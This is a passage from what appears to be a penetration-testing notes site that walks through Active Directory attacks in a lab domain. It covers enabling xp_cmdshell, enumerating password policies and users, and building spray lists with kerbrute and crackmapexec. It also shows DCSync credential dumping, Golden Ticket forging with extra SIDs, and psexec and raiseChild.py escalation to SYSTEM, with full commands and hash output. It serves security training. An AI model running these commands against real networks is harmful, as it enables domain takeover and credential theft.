Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(ACADEMY-EA-DB01\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(ACADEMY-EA-DB01\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) \n[!] Press help for extra shell commands\n</code></pre> <p>We could then choose <code>enable_xp_cmdshell</code> to enable the xp_cmdshell stored procedure if the account in question has the proper access rights.</p> <pre><code>SQL&gt; enable_xp_cmdshell\n\n[*] INFO(ACADEMY-EA-DB01\\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.\n[*] INFO(ACADEMY-EA-DB01\\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.\n</code></pre> <p>Here we can enumerate the rights that our user has on the system and see that we have SeImpersonatePrivilege, which can be leveraged in combination with a tool such as JuicyPotato, PrintSpoofer, or RoguePotato to escalate to <code>SYSTEM</code> level privileges.</p> <pre><code>xp_cmdshell whoami /priv\noutput                                                                             \n\n--------------------------------------------------------------------------------   \n\nNULL                                                                               \n\nPRIVILEGES INFORMATION                                                             \n\n----------------------                                                             \n\nNULL                                                                               \n\nPrivilege Name                Description                               State      \n\n============================= ========================================= ========   \n\nSeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   \n\nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   \n\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    \n\nSeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    \n\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled    \n\nSeCreateGlobalPrivilege       Create global objects                     Enabled    \n\nSeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   \n\nNULL                                                               \n</code></pre>","title":"Privileged Access"},{"location":"active_directory/userhunting/enumerate_retrieve_pwdpol/","text":"Enumerating the Password Policy - from Linux - Credentialed <pre><code>secops@kali[/kali]$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:legalcorp.local) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] legalcorp.local\\avazquez:Password123 \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Dumping password info for domain: LEGALCORP\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password length: 8\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Password history length: 24\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Maximum password age: Not Set\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Password Complexity Flags: 000001\nSMB         172.16.5.5      445    ACADEMY-EA-DC01      Domain Refuse Password Change: 0\nSMB         172.16.5.5      445    ACADEMY-EA-DC01      Domain Password Store Cleartext: 0\nSMB         172.16.5.5      445    ACADEMY-EA-DC01      Domain Password Lockout Admins: 0\nSMB         172.16.5.5      445    ACADEMY-EA-DC01      Domain Password No Clear Change: 0\nSMB         172.16.5.5      445    ACADEMY-EA-DC01      Domain Password No Anon Change: 0\nSMB         172.16.5.5      445    ACADEMY-EA-DC01      Domain Password Complex: 1\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password age: 1 day 4 minutes \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Reset Account Lockout Counter: 30 minutes \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Locked Account Duration: 30 minutes \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Account Lockout Threshold: 5\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Forced Log off Time: Not Set\n</code></pre>  Enumerating the Password Policy - from Linux - SMB NULL Sessions <p>Without credentials, we may be able to obtain the password policy via an SMB NULL session or LDAP anonymous bind.</p> <pre><code>secops@kali[/kali]$ rpcclient -U \"\" -N 172.16.5.5\n\nrpcclient $&gt; querydominfo\nDomain:     LEGALCORP\nServer:     \nComment:    \nTotal Users:    3650\nTotal Groups:   0\nTotal Aliases:  37\nSequence No:    1\nForce Logoff:   -1\nDomain Server State:    0x1\nServer Role:    ROLE_DOMAIN_PDC\nUnknown 3:  0x1\n</code></pre> <p>Obtain the password policy. <pre><code>rpcclient $&gt; querydominfo\n\nDomain:     LEGALCORP\nServer:     \nComment:    \nTotal Users:    3650\nTotal Groups:   0\nTotal Aliases:  37\nSequence No:    1\nForce Logoff:   -1\nDomain Server State:    0x1\nServer Role:    ROLE_DOMAIN_PDC\nUnknown 3:  0x1\nrpcclient $&gt; getdompwinfo\nmin_password_length: 8\npassword_properties: 0x00000001\n    DOMAIN_PASSWORD_COMPLEX\n</code></pre></p> <p>enum4linux.</p> <pre><code>secops@kali[/kali]$ enum4linux -P 172.16.5.5\n\n&lt;SNIP&gt;\n\n ================================================== \n|    Password Policy Information for 172.16.5.5    |\n ================================================== \n\n[+] Attaching to 172.16.5.5 using a NULL share\n[+] Trying protocol 139/SMB...\n\n    [!] Protocol failed: Cannot request session (Called Name:172.16.5.5)\n\n[+] Trying protocol 445/SMB...\n[+] Found domain(s):\n\n    [+] LEGALCORP\n    [+] Builtin\n\n[+] Password Info for Domain: LEGALCORP\n\n    [+] Minimum password length: 8\n    [+] Password history length: 24\n    [+] Maximum password age: Not Set\n    [+] Password Complexity Flags: 000001\n\n        [+] Domain Refuse Password Change: 0\n        [+] Domain Password Store Cleartext: 0\n        [+] Domain Password Lockout Admins: 0\n        [+] Domain Password No Clear Change: 0\n        [+] Domain Password No Anon Change: 0\n        [+] Domain Password Complex: 1\n\n    [+] Minimum password age: 1 day 4 minutes \n    [+] Reset Account Lockout Counter: 30 minutes \n    [+] Locked Account Duration: 30 minutes \n    [+] Account Lockout Threshold: 5\n    [+] Forced Log off Time: Not Set\n\n[+] Retieved partial password policy with rpcclient:\n\nPassword Complexity: Enabled\nMinimum Password Length: 8\n\nenum4linux complete on Tue Feb 22 17:39:29 2022\n</code></pre> <p>Enum4linux-ng provides us with a bit clearer output and handy JSON and YAML output using the -oA flag. <pre><code>secops@kali[/kali]$ enum4linux-ng -P 172.16.5.5 -oA lcorp\n\nENUM4LINUX - next generation\n\n&lt;SNIP&gt;\n\n =======================================\n|    RPC Session Check on 172.16.5.5    |\n =======================================\n[*] Check for null session\n[+] Server allows session using username '', password ''\n[*] Check for random user session\n[-] Could not establish random user session: STATUS_LOGON_FAILURE\n\n =================================================\n|    Domain Information via RPC for 172.16.5.5    |\n =================================================\n[+] Domain: LEGALCORP\n[+] SID: S-1-5-21-3842939050-3880317879-2865463114\n[+] Host is part of a domain (not a workgroup)\n =========================================================\n|    Domain Information via SMB session for 172.16.5.5    |\n========================================================\n[*] Enumerating via unauthenticated SMB session on 445/tcp\n[+] Found domain information via SMB\nNetBIOS computer name: ACADEMY-EA-DC01\nNetBIOS domain name: LEGALCORP\nDNS domain: legalcorp.local\nFQDN: ACADEMY-EA-DC01.legalcorp.local\n\n =======================================\n|    Policies via RPC for 172.16.5.5    |\n =======================================\n[*] Trying port 445/tcp\n[+] Found policy:\ndomain_password_information:\n  pw_history_length: 24\n  min_pw_length: 8\n  min_pw_age: 1 day 4 minutes\n  max_pw_age: not set\n  pw_properties:\n  - DOMAIN_PASSWORD_COMPLEX: true\n  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false\n  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false\n  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false\n  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false\n  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false\ndomain_lockout_information:\n  lockout_observation_window: 30 minutes\n  lockout_duration: 30 minutes\n  lockout_threshold: 5\ndomain_logoff_information:\n  force_logoff_time: not set\n\nCompleted after 5.41 seconds\n</code></pre></p> <p>Displaying the contents of lcorp.json <pre><code>secops@kali[/kali]$ cat lcorp.json \n\n{\n    \"target\": {\n        \"host\": \"172.16.5.5\",\n        \"workgroup\": \"\"\n    },\n    \"credentials\": {\n        \"user\": \"\",\n        \"password\": \"\",\n        \"random_user\": \"yxditqpc\"\n    },\n    \"services\": {\n        \"SMB\": {\n            \"port\": 445,\n            \"accessible\": true\n        },\n        \"SMB over NetBIOS\": {\n            \"port\": 139,\n            \"accessible\": true\n        }\n    },\n    \"smb_dialects\": {\n        \"SMB 1.0\": false,\n        \"SMB 2.02\": true,\n        \"SMB 2.1\": true,\n        \"SMB 3.0\": true,\n        \"SMB1 only\": false,\n        \"Preferred dialect\": \"SMB 3.0\",\n        \"SMB signing required\": true\n    },\n    \"sessions_possible\": true,\n    \"null_session_possible\": true,\n\n&lt;SNIP&gt;\n</code></pre></p>  Enumerating the Password Policy - from Linux - LDAP Anonymous Bind <p>LDAP anonymous binds allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.</p> <pre><code>secops@kali[/kali]$ ldapsearch -h 172.16.5.5 -x -b \"DC=LEGALCORP,DC=LOCAL\" -s sub \"*\" | grep -m 1 -B 10 pwdHistoryLength\n\nforceLogoff: -9223372036854775808\nlockoutDuration: -18000000000\nlockOutObservationWindow: -18000000000\nlockoutThreshold: 5\nmaxPwdAge: -9223372036854775808\nminPwdAge: -864000000000\nminPwdLength: 8\nmodifiedCountAtLastProm: 0\nnextRid: 1002\npwdProperties: 1\npwdHistoryLength: 24\n</code></pre>  Enumerating the Password Policy - from Windows <p>If we can authenticate to the domain from a Windows host, we can use built-in Windows binaries such as <code>net.exe</code> to retrieve the password policy. </p> <pre><code>C:\\xyz&gt; net accounts\n\nForce user logoff how long after time expires?:       Never\nMinimum password age (days):                          1\nMaximum password age (days):                          Unlimited\nMinimum password length:                              8\nLength of password history maintained:                24\nLockout threshold:                                    5\nLockout duration (minutes):                           30\nLockout observation window (minutes):                 30\nComputer role:                                        SERVER\nThe command completed successfully.\n</code></pre> <p>PowerView is also quite handy for this: <pre><code>PS C:\\xyz&gt; import-module .\\PowerView.ps1\nPS C:\\xyz&gt; Get-DomainPolicy\n\nUnicode        : @{Unicode=yes}\nSystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;\n                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;\n                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;\n                 LSAAnonymousNameLookup=0}\nKerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}\nVersion        : @{signature=\"$CHICAGO$\"; Revision=1}\nRegistryValues : @{MACHINE\\System\\CurrentControlSet\\Control\\Lsa\\NoLMHash=System.Object[]}\nPath           : \\\\legalcorp.local\\sysvol\\legalcorp.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHI\n                 NE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf\nGPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}\nGPODisplayName : Default Domain Policy\n</code></pre></p>","title":"Enumerating & Retrieving PwdPols"},{"location":"active_directory/userhunting/pwd_spraying_target_user_list/","text":"<p>To mount a successful password spraying attack, we first need a list of valid domain users to attempt to authenticate with.</p> SMB NULL Session to Pull User List <p>This user list will not be as complete, but it may be enough to provide access to Active Directory.</p> <pre><code>secops@kali[/kali]$ enum4linux -U 172.16.5.5  | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"]\"\n\nadministrator\nguest\nkrbtgt\nlab_adm\nuser\navazquez\npfalcon\nfanthony\nwdillard\nlbradford\nsgage\nasanchez\ndbranch\nccruz\nnjohnson\nmholliday\n\n&lt;SNIP&gt;\n</code></pre> <p>We can use the <code>enumdomusers</code> command after connecting anonymously using <code>rpcclient</code>.</p> <pre><code>secops@kali[/kali]$ rpcclient -U \"\" -N 172.16.5.5\n\nrpcclient $&gt; enumdomusers \nuser:[administrator] rid:[0x1f4]\nuser:[guest] rid:[0x1f5]\nuser:[krbtgt] rid:[0x1f6]\nuser:[lab_adm] rid:[0x3e9]\nuser:[user] rid:[0x457]\nuser:[avazquez] rid:[0x458]\n\n&lt;SNIP&gt;\n</code></pre> <p>Finally, we can use <code>CrackMapExec</code> with the <code>--users</code> flag. This is a useful tool that will also show the <code>badpwdcount</code> (invalid login attempts), so we can remove any accounts from our list that are close to the lockout threshold. It also shows the <code>baddpwdtime</code>, which is the date and time of the last bad password attempt, so we can see how close an account is to having its <code>badpwdcount</code> reset.</p>  <p>Note: In an environment with multiple Domain Controllers, this value is maintained separately on each one. To get an accurate total of the account's bad password attempts, we would have to either query each Domain Controller and use the sum of the values or query the Domain Controller with the PDC Emulator FSMO role.</p>  <pre><code>secops@kali[/kali]$ crackmapexec smb 172.16.5.5 --users\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:legalcorp.local) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  legalcorp.local\\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  legalcorp.local\\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  legalcorp.local\\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  legalcorp.local\\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  legalcorp.local\\user                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  legalcorp.local\\avazquez                       badpwdcount: 0 baddpwdtime: 2022-02-17 22:59:22.684613\n\n&lt;SNIP&gt;\n</code></pre>  Gathering Users with LDAP Anonymous <pre><code>secops@kali[/kali]$ ldapsearch -h 172.16.5.5 -x -b \"DC=LEGALCORP,DC=LOCAL\" -s sub \"(&amp;(objectclass=user))\"  | grep sAMAccountName: | cut -f2 -d\" \"\n\nguest\nACADEMY-EA-DC01$\nACADEMY-EA-MS01$\nACADEMY-EA-WEB01$\nuser\navazquez\npfalcon\nfanthony\nwdillard\nlbradford\nsgage\nasanchez\ndbranch\n\n&lt;SNIP&gt;\n</code></pre> <p>Tools such as <code>windapsearch</code> make this easier. Here we can specify anonymous access by providing a blank username with the <code>-u</code> flag and the <code>-U</code> flag to tell the tool to retrieve just users.</p> <pre><code>secops@kali[/kali]$ ./windapsearch.py --dc-ip 172.16.5.5 -u \"\" -U\n\n[+] No username provided. Will try anonymous bind.\n[+] Using Domain Controller at: 172.16.5.5\n[+] Getting defaultNamingContext from Root DSE\n[+] Found: DC=LEGALCORP,DC=LOCAL\n[+] Attempting bind\n[+] ...success! Binded as: \n[+]  None\n\n[+] Enumerating all AD users\n[+] Found 2906 users: \n\ncn: Guest\n\ncn: xyz Student\nuserPrincipalName: user@legalcorp.local\n\ncn: Annie Vazquez\nuserPrincipalName: avazquez@legalcorp.local\n\ncn: Paul Falcon\nuserPrincipalName: pfalcon@legalcorp.local\n\ncn: Fae Anthony\nuserPrincipalName: fanthony@legalcorp.local\n\ncn: Walter Dillard\nuserPrincipalName: wdillard@legalcorp.local\n\n&lt;SNIP&gt;\n</code></pre>  Enumerating Users with Kerbrute <p>If we have no access at all from our position in the internal network, we can use <code>Kerbrute</code> to enumerate valid AD accounts and for password spraying.</p> <pre><code>secops@kali[/kali]$  kerbrute userenum -d legalcorp.local --dc 172.16.5.5 /opt/jsmith.txt \n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop\n\n2022/02/17 22:16:11 &gt;  Using KDC(s):\n2022/02/17 22:16:11 &gt;   172.16.5.5:88\n\n2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:   jjones@legalcorp.local\n2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:   sbrown@legalcorp.local\n2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:   tjohnson@legalcorp.local\n2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:   jwilson@legalcorp.local\n2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:   bdavis@legalcorp.local\n2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:   njohnson@legalcorp.local\n2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:   asanchez@legalcorp.local\n2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:   dlewis@legalcorp.local\n2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:   ccruz@legalcorp.local\n\n&lt;SNIP&gt;\n</code></pre>  <p><p>Using Kerbrute for username enumeration will generate event ID 4768: A Kerberos authentication ticket (TGT) was requested. This will only be triggered if Kerberos event logging is enabled via Group Policy. Defenders can tune their SIEM tools to look for an influx of this event ID, which may indicate an attack. If we are successful with this method during a penetration test, this can be an excellent recommendation to add to our report.</p></p> <p><p>If we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as linkedin2username to mash up possible usernames from a company's LinkedIn page.</p></p>   Credentialed Enumeration to Build our User List <pre><code>secops@kali[/kali]$ sudo crackmapexec smb 172.16.5.5 -u user -p Academy_student_AD! --users\n\n[sudo] password for user: \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:legalcorp.local) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] legalcorp.local\\user:Academy_student_AD! \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  legalcorp.local\\administrator                  badpwdcount: 1 baddpwdtime: 2022-02-23 21:43:35.059620\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  legalcorp.local\\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  legalcorp.local\\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  legalcorp.local\\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  legalcorp.local\\user                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  legalcorp.local\\avazquez                       badpwdcount: 20 baddpwdtime: 2022-02-17 22:59:22.684613\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  legalcorp.local\\pfalcon                        badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58\n\n&lt;SNIP&gt;\n</code></pre>","title":"Pwd Spraying - Making a Targeted User List"},{"location":"active_directory/why_so_trusting/atk_dom_trust_child_parent_trust_from_linux/","text":"<p>We can also perform the attack shown in the previous section from a Linux attack host. To do so, we'll still need to gather the same bits of information:</p> <ul> <li>The KRBTGT hash for the child domain</li> <li>The SID for the child domain</li> <li>The name of a target user in the child domain (does not need to exist!)</li> <li>The FQDN of the child domain</li> <li>The SID of the Enterprise Admins group of the root domain</li> </ul> <p>Once we have complete control of the child domain, <code>LOGISTICS.legalcorp.local</code>, we can use <code>secretsdump.py</code> to DCSync and grab the NTLM hash for the KRBTGT account.</p> <p>Performing DCSync with secretsdump.py <pre><code>secops@kali[/kali]$ secretsdump.py logistics.legalcorp.local/user_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt\n\nImpacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation\n\nPassword:\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::\n[*] Kerberos keys grabbed\nkrbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8\nkrbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e\nkrbtgt:des-cbc-md5:fee04c3d026d7538\n[*] Cleaning up...\n</code></pre></p> <p>Next, we can use lookupsid.py to perform SID brute forcing to find the SID of the child domain. In this command, whatever we specify for the IP address (the IP of the domain controller in the child domain) will become the target domain for a SID lookup. The tool will give us back the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format <code>DOMAIN_SID-RID</code>. For example, from the output below, we can see that the SID of the <code>lab_adm</code> user would be <code>S-1-5-21-2806153819-209893948-922872689-1001</code>.</p> <pre><code>secops@kali[/kali]$ lookupsid.py logistics.legalcorp.local/user_adm@172.16.5.240 \n\nImpacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation\n\nPassword:\n[*] Brute forcing SIDs at 172.16.5.240\n[*] StringBinding ncacn_np:172.16.5.240[\\pipe\\lsarpc]\n[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689\n500: LOGISTICS\\Administrator (SidTypeUser)\n501: LOGISTICS\\Guest (SidTypeUser)\n502: LOGISTICS\\krbtgt (SidTypeUser)\n512: LOGISTICS\\Domain Admins (SidTypeGroup)\n513: LOGISTICS\\Domain Users (SidTypeGroup)\n514: LOGISTICS\\Domain Guests (SidTypeGroup)\n515: LOGISTICS\\Domain Computers (SidTypeGroup)\n516: LOGISTICS\\Domain Controllers (SidTypeGroup)\n517: LOGISTICS\\Cert Publishers (SidTypeAlias)\n520: LOGISTICS\\Group Policy Creator Owners (SidTypeGroup)\n521: LOGISTICS\\Read-only Domain Controllers (SidTypeGroup)\n522: LOGISTICS\\Cloneable Domain Controllers (SidTypeGroup)\n525: LOGISTICS\\Protected Users (SidTypeGroup)\n526: LOGISTICS\\Key Admins (SidTypeGroup)\n553: LOGISTICS\\RAS and IAS Servers (SidTypeAlias)\n571: LOGISTICS\\Allowed RODC Password Replication Group (SidTypeAlias)\n572: LOGISTICS\\Denied RODC Password Replication Group (SidTypeAlias)\n1001: LOGISTICS\\lab_adm (SidTypeUser)\n1002: LOGISTICS\\ACADEMY-EA-DC02$ (SidTypeUser)\n1103: LOGISTICS\\DnsAdmins (SidTypeAlias)\n1104: LOGISTICS\\DnsUpdateProxy (SidTypeGroup)\n1105: LOGISTICS\\LEGALCORP$ (SidTypeUser)\n1106: LOGISTICS\\user_adm (SidTypeUser)\n</code></pre> <p>We can filter out the noise by piping the command output to grep and looking for just the domain SID. <pre><code>secops@kali[/kali]$ lookupsid.py logistics.legalcorp.local/user_adm@172.16.5.240 | grep \"Domain SID\"\n\nPassword:\n\n[*] Domain SID is: S-1-5-21-2806153819-209893948-92287268\n</code></pre></p> <p>Targeting the LEGALCORP Domain Controller (DC01) at 172.16.5.5 and grab the domain <code>SID S-1-5-21-3842939050-3880317879-2865463114</code> and attach the RID of the Enterprise Admins group. Here is a handy list of well-known SIDs.</p> <pre><code>secops@kali[/kali]$ lookupsid.py logistics.legalcorp.local/user_adm@172.16.5.5 | grep -B12 \"Enterprise Admins\"\n\nPassword:\n[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114\n498: LEGALCORP\\Enterprise Read-only Domain Controllers (SidTypeGroup)\n500: LEGALCORP\\administrator (SidTypeUser)\n501: LEGALCORP\\guest (SidTypeUser)\n502: LEGALCORP\\krbtgt (SidTypeUser)\n512: LEGALCORP\\Domain Admins (SidTypeGroup)\n513: LEGALCORP\\Domain Users (SidTypeGroup)\n514: LEGALCORP\\Domain Guests (SidTypeGroup)\n515: LEGALCORP\\Domain Computers (SidTypeGroup)\n516: LEGALCORP\\Domain Controllers (SidTypeGroup)\n517: LEGALCORP\\Cert Publishers (SidTypeAlias)\n518: LEGALCORP\\Schema Admins (SidTypeGroup)\n519: LEGALCORP\\Enterprise Admins (SidTypeGroup)\n</code></pre> <p>We have gathered the following data points to construct the command for our attack. Once again, we will use the non-existent user <code>hacker</code> to forge our Golden Ticket.</p> <ul> <li>The KRBTGT hash for the child domain: <code>9d765b482771505cbe97411065964d5f</code> </li> <li>The SID for the child domain: <code>S-1-5-21-2806153819-209893948-922872689</code> </li> <li>The name of a target user in the child domain (does not need to exist!): <code>hacker</code> </li> <li>The FQDN of the child domain: <code>LOGISTICS.legalcorp.local</code> </li> <li>The SID of the Enterprise Admins group of the root domain: <code>S-1-5-21-3842939050-3880317879-2865463114-519</code> </li> </ul> <p>Next, we can use ticketer.py to construct a Golden Ticket. This ticket will be valid to access resources in the child domain (specified by <code>-domain-sid</code>) and the parent domain (specified by <code>-extra-sid</code>).</p> <pre><code>secops@kali[/kali]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.legalcorp.local -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker\n\nImpacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation\n\n[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for LOGISTICS.legalcorp.local/hacker\n[*]     PAC_LOGON_INFO\n[*]     PAC_CLIENT_INFO_TYPE\n[*]     EncTicketPart\n[*]     EncAsRepPart\n[*] Signing/Encrypting final ticket\n[*]     PAC_SERVER_CHECKSUM\n[*]     PAC_PRIVSVR_CHECKSUM\n[*]     EncTicketPart\n[*]     EncASRepPart\n[*] Saving ticket in hacker.ccache\n</code></pre> <p>The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials. Setting the <code>KRB5CCNAME</code> environment variable tells the system to use this file for Kerberos authentication attempts.</p> <pre><code>secops@kali[/kali]$ export KRB5CCNAME=hacker.ccache \n</code></pre> <p>We can check if we can successfully authenticate to the parent domain's Domain Controller.</p> <pre><code>secops@kali[/kali]$ psexec.py LOGISTICS.legalcorp.local/hacker@academy-ea-dc01.legalcorp.local -k -no-pass -target-ip 172.16.5.5\n\nImpacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation\n\n[*] Requesting shares on 172.16.5.5.....\n[*] Found writable share ADMIN$\n[*] Uploading file nkYjGWDZ.exe\n[*] Opening SVCManager on 172.16.5.5.....\n[*] Creating service eTCU on 172.16.5.5.....\n[*] Starting service eTCU.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17763.107]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt; whoami\nnt authority\\system\n\nC:\\Windows\\system32&gt; hostname\nACADEMY-EA-DC01\n</code></pre>  Performing the Attack with raiseChild.py <p>Impacket also has the tool raiseChild.py, which will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest.</p> <pre><code>secops@kali[/kali]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.legalcorp.local/user_adm\n\nImpacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation\n\nPassword:\n[*] Raising child domain LOGISTICS.legalcorp.local\n[*] Forest FQDN is: legalcorp.local\n[*] Raising LOGISTICS.legalcorp.local to legalcorp.local\n[*] legalcorp.local Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519\n[*] Getting credentials for LOGISTICS.legalcorp.local\nLOGISTICS.legalcorp.local/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::\nLOGISTICS.legalcorp.local/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8\n[*] Getting credentials for legalcorp.local\nlegalcorp.local/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::\nlegalcorp.local/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d\n[*] Target User account name is administrator\nlegalcorp.local/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::\nlegalcorp.local/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6\n[*] Opening PSEXEC shell at ACADEMY-EA-DC01.legalcorp.local\n[*] Requesting shares on ACADEMY-EA-DC01.legalcorp.local.....\n[*] Found writable share ADMIN$\n[*] Uploading file BnEGssCE.exe\n[*] Opening SVCManager on ACADEMY-EA-DC01.legalcorp.local.....\n[*] Creating service UVNb on ACADEMY-EA-DC01.legalcorp.local.....\n[*] Starting service UVNb.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17763.107]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nnt authority\\system\n\nC:\\Windows\\system32&gt;exit\n[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0\n[*] 